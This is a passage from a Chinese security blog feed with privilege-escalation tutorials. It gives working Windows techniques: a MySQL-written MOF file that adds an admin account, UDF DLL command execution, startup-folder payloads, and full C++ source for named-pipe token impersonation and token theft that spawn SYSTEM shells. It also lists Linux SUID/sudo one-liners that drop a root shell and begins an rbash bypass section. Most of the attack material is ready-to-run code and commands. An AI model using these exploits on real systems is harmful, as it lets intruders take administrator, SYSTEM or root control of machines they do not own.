title="MOF提权"></a>MOF提权</h3><p>在c:/windows/system32/wbem/mof/目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次（由”And TargetInstance.Second = 5″;控制，这里输入5就是每分钟的第五秒执行。 那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。</p><p>前提是我们要能进入数据库进行操作，且mysql数据库的权限尽可能高才更有利。同时secure-file-priv 要为空（ mysql 5.6.34版本以后 secure_file_priv的值默认为NULL,禁止所有文件导入导出功能）</p><p>我们伪造的MOF文件格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">    &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;;   &#x2F;&#x2F;修改此处即可</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>修改上面的cmd部分即可实现以管理员身份执行各种命令。<br>然后我们使用mysql下的命令 ，将mof覆盖过去。<br>待我们的命令被执行后，即代表提权成功。<br>Windows 2003似乎成功率蛮高的，WIN7试了试没反应。。。</p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>（这个也可以linux提权</p><p>udf，即自定义函数（user define function）</p><p>MYSQL可以自定义函数的。自定义函数在Windows下是以DLL文件存在于MYSQL的插件文件夹里面的（linux则是以os的形式）。我们可以自定义一个恶意dll，里面存放着可以执行系统命令的 函数。然后交给mysql以数据库权限执行。</p><p>前提：我们能操作数据库，且数据库权限必须很高（我们用这个方法提权到的权限就是数据库的权限</p><p>那么这个dll文件哪里来呢。sqlmap和msf都有。sqlmap下的 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 就是这个dll文件的编码版本。我们使用sqlmap下的sqlmap/extra/cloak/cloak.py对其进行解码获得dll文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;cloak.py -d -i .&#x2F;lib_mysqludf_sys.dll_  即可获得dll文件</span><br></pre></td></tr></table></figure><p>然后我们把dll文件放入mysql的插件文件夹，命名为udf.dll。插件文件夹可以通过命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;获得  （&#x2F;lib&#x2F;plugin文件夹需要自己创建）</span><br></pre></td></tr></table></figure><p>至于怎么把dll放入插件文件夹</p><p>1.直接粘贴复制 （权限可能不够<br>2.使用命令 select load_file(‘udf.dll’) into dumpfile “PLUGIN的路径”;(需要secure_file_priv为空</p><p>总之，如果把udf.dll放入plugin文件夹后，我们就可以执行以下操作提权了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create funtion sys_eval returns string soname &quot;udf.dll&quot;;</span><br><span class="line">select sys_eval(&#39;cmd&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144509.png" alt="QQ截图20210217144509"></p><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><p>说白了，就是通过mysql的高权限，向windows开机启动项文件夹里放入恶意vbs或者bat脚本,机器重启后自动执行。怎么让机器重启？等管理员或者 一些可导致服务器蓝屏的EXP<br>启动项路径一般为：<br>C:\Documents and Settings\All Users\「开始」菜单\程序\启动<br>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144534.png" alt="QQ截图20210217144534"></p><p>没什么好说的</p><h2 id="命名管道提权"><a href="#命名管道提权" class="headerlink" title="命名管道提权"></a>命名管道提权</h2><p>提权方式为 令牌模仿。 Token Impersonation .</p><p>meterpreter的getsystem的提取方法之一就是这个方法</p><p>提权过程为从administrator用户提到SYSTEM权限。从普通用户提权到admin及以上权限是不可取的，因为普通用户创建的命名管道没有 <code>SeImpersonatePrivilege</code>，在复制令牌时会出现1346错误。</p><p>该方法技术细节为：以管理员权限创建一个命名管道，再通过创建SYSTEM权限服务，让服务连上命名管道，随后我们通过模拟客户端，获得SYSTEM权限的令牌，随后将其复制，再用复制后的令牌创建新进程（如CMD)，新进程的权限即SYSTEM权限。</p><p>这里贴上实现代码.<br>首先是被创建的服务的实现代码，该服务启动后会不断向服务器命名管道建立链接<br>生成好后，是Service.exe</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">SERVICE_STATUS m_ServiceStatus;</span><br><span class="line">SERVICE_STATUS_HANDLE m_ServiceStatusHandle;</span><br><span class="line">BOOL bRunning;</span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);</span><br><span class="line">void WINAPI HandlerFunc(DWORD code);</span><br><span class="line">int main() &#123;</span><br><span class="line">WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING;</span><br><span class="line">m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP;</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; true;</span><br><span class="line">while (bRunning) &#123;</span><br><span class="line">LPCWSTR PipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">HANDLE PipeHandle&#x3D;NULL;</span><br><span class="line">BOOL PipeInstance;</span><br><span class="line">WCHAR message[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">DWORD bytesWritten &#x3D; 0;</span><br><span class="line">BOOL Flag &#x3D; true;</span><br><span class="line">wchar_t message2[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">DWORD messageLength &#x3D; lstrlen(message2) * 2;</span><br><span class="line">do &#123;</span><br><span class="line">PipeHandle &#x3D; CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">&#125; while (PipeHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE);</span><br><span class="line"></span><br><span class="line">WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL);</span><br><span class="line"></span><br><span class="line">Flag &#x3D; ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL);</span><br><span class="line">std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI HandlerFunc(DWORD code) &#123;</span><br><span class="line">switch (code) &#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是主体，命名管道服务器。生成后是Server.exe</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">LPCWSTR pipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">LPVOID pipeBuffer &#x3D; NULL;</span><br><span class="line">HANDLE serverPipe;</span><br><span class="line">DWORD readBytes &#x3D; 0;</span><br><span class="line">DWORD readBuffer &#x3D; 0;</span><br><span class="line">int err &#x3D; 0;</span><br><span class="line">BOOL isPipeConnected;</span><br><span class="line">BOOL isPipeOpen;</span><br><span class="line">wchar_t message[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">DWORD messageLenght &#x3D; lstrlen(message) * 2;</span><br><span class="line">DWORD bytesWritten &#x3D; 0;</span><br><span class="line">WCHAR message2[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;Open a Named Pipe,Wait for a connection</span><br><span class="line">std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">serverPipe &#x3D; CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Create a service of system to connect to our NamedPipe.</span><br><span class="line"></span><br><span class="line">char servicename[] &#x3D; &quot;Service.exe&quot;;</span><br><span class="line">char servicepath[_MAX_PATH];</span><br><span class="line">SERVICE_STATUS status;</span><br><span class="line">GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));</span><br><span class="line">SC_HANDLE scManager &#x3D; OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">SC_HANDLE scService &#x3D; CreateServiceA(scManager, servicename, servicename,</span><br><span class="line">SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,</span><br><span class="line">servicepath, NULL, NULL, NULL, NULL, NULL);</span><br><span class="line">if (!scService) &#123;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 1073) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">SC_HANDLE scServiceA &#x3D; OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);</span><br><span class="line">if (StartService(scServiceA, 0, NULL)) &#123;</span><br><span class="line">std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 1056) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;service is running,don&#39;t need to start again&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;Connect !</span><br><span class="line">isPipeConnected &#x3D; ConnectNamedPipe(serverPipe, NULL);</span><br><span class="line"></span><br><span class="line">if (isPipeConnected) &#123;</span><br><span class="line">std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL);</span><br><span class="line">std::cout &lt;&lt; message2;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);</span><br><span class="line">&#x2F;&#x2F;Toekn Impersonation</span><br><span class="line">std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl;</span><br><span class="line">if (!ImpersonateNamedPipeClient(serverPipe)) &#123;</span><br><span class="line">std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi &#x3D; &#123;&#125;;</span><br><span class="line">ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line">ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">si.cb &#x3D; sizeof(si);</span><br><span class="line">HANDLE token;</span><br><span class="line">if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CHAR command1[] &#x3D; &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">WCHAR command2[] &#x3D; L&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">HANDLE Token;</span><br><span class="line">if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl;</span><br><span class="line">if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(1)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们生成了Service.exe,然后把他移到Server.exe同级目录，以管理员权限运行Server.exe,即可达到admin-》system的提权。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144553.png" alt="QQ截图20210217144553"></p><p>程序写了四天终于写好了。。WIN7下可以实现完美提权。<br>项目地址:<a href="https://github.com/ConsT27/EvilNamedPipe/tree/1.0">https://github.com/ConsT27/EvilNamedPipe/tree/1.0</a></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>SYSTEM-&gt;本机上其他用户（包括域用户）(好家伙，只要本机有system权限，域管敢在本机上创建进程就直接能拿到域管权限） 或者admin获取debug权限后去获取SYSTEM权限（这里有一个细节点，只有owner为administrator的SYSTEM进程才能被利用，比如lsass，dllhost)</p><p>技术细节:通过寻找高权限开启的进程，再复制其令牌用以创建新进程，即可达到提权目的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only administrator can get debug priv</span><br><span class="line">BOOL GetDebugPriv() &#123;</span><br><span class="line">HANDLE Token;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID Luid;</span><br><span class="line">if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">tp.Privileges[0].Luid &#x3D; Luid;</span><br><span class="line">if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">HANDLE t_process;</span><br><span class="line">HANDLE token &#x3D; NULL;</span><br><span class="line">HANDLE token_bak &#x3D; NULL;</span><br><span class="line">DWORD process_id;</span><br><span class="line">sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id);</span><br><span class="line">WCHAR command[] &#x3D; L&quot;C:\\Windows\\System32\\cmd.exe&quot;;</span><br><span class="line">STARTUPINFO startupInfo;</span><br><span class="line">PROCESS_INFORMATION processInformation;</span><br><span class="line">ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO));</span><br><span class="line">ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION));</span><br><span class="line">startupInfo.cb &#x3D; sizeof(STARTUPINFO);</span><br><span class="line">std::cout &lt;&lt; argv[1] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl;</span><br><span class="line">if (GetDebugPriv()&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">system(&quot;whoami &#x2F;priv&quot;);</span><br><span class="line">t_process &#x3D; OpenProcess(PROCESS_ALL_ACCESS, true, process_id);</span><br><span class="line">if (!t_process) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144620.png" alt="QQ截图20210217144620"></p><p>这是在win7下的测试结果 const\administrator 是域控</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;无引号服务路径-（-Trusted-Service-Paths-）&quot;&gt;&lt;a href=&quot;#无引号服务路径-（-Trusted-Service-Paths-）&quot; class=&quot;headerlink&quot; title=&quot;无引号服务路径 （ Trusted Service </summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux 提权总结</title>
    <link href="http://const27.com/2021/06/28/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://const27.com/2021/06/28/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2021-06-28T13:52:05.783Z</published>
    <updated>2021-03-16T13:36:09.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sudo-和-suid-提权"><a href="#sudo-和-suid-提权" class="headerlink" title="sudo 和 suid 提权"></a>sudo 和 suid 提权</h1><h2 id="何为suid"><a href="#何为suid" class="headerlink" title="何为suid"></a>何为suid</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145316.png" alt="QQ截图20210217145316"></p><p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？<br>答案是当其他用户执行该文件时，该文件会以root的身份执行。<br>这里就涉及到了Effective UID和Real UID以及Saved UID<br>Effective UID: 程序实际操作时生效的UID<br>Real UID: 执行该程序的用户的实际UID<br>Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p><p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p><h2 id="SUID与sudo提权"><a href="#SUID与sudo提权" class="headerlink" title="SUID与sudo提权"></a>SUID与sudo提权</h2><h3 id="遍历目录中的suid文件"><a href="#遍历目录中的suid文件" class="headerlink" title="遍历目录中的suid文件"></a>遍历目录中的suid文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>执行该命令，会得到所有suid文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145327.png" alt="QQ截图20210217145327"></p><h3 id="用sudo-l-查看哪些命令能被sudo"><a href="#用sudo-l-查看哪些命令能被sudo" class="headerlink" title="用sudo -l 查看哪些命令能被sudo"></a>用sudo -l 查看哪些命令能被sudo</h3><h3 id="可利用于提权的命令"><a href="#可利用于提权的命令" class="headerlink" title="可利用于提权的命令"></a>可利用于提权的命令</h3><h5 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shell</span><br><span class="line">nmap --script&#x3D;shell</span><br></pre></td></tr></table></figure><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p><h5 id="2-find"><a href="#2-find" class="headerlink" title="2.find"></a>2.find</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -exec command</span><br></pre></td></tr></table></figure><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件 find &#x2F;path -exec &#123;&#125; \;</span><br></pre></td></tr></table></figure><h5 id="3-vim"><a href="#3-vim" class="headerlink" title="3.vim"></a>3.vim</h5><p>vim有了suid就可以任意文件读取了</p><p>同时也可以输入 :shell</p><p>来获取root shell</p><h5 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p  开启一个新shell，suid的话自然是开启root shell</span><br></pre></td></tr></table></figure><h5 id="5-less，more"><a href="#5-less，more" class="headerlink" title="5.less，more"></a>5.less，more</h5><p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p><h5 id="6-exim"><a href="#6-exim" class="headerlink" title="6.exim"></a>6.exim</h5><p>exim在特定版本下会有suid提权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145341.png" alt="QQ截图20210217145341"></p><p>下载exp打就完事了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h1><h2 id="何为rbash"><a href="#何为rbash" class="headerlink" title="何为rbash"></a>何为rbash</h2><p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p><ul><li>cd 切换目录</li><li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li><li>设置 PATH ENV 等环境变量</li><li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li><li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li></ul><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 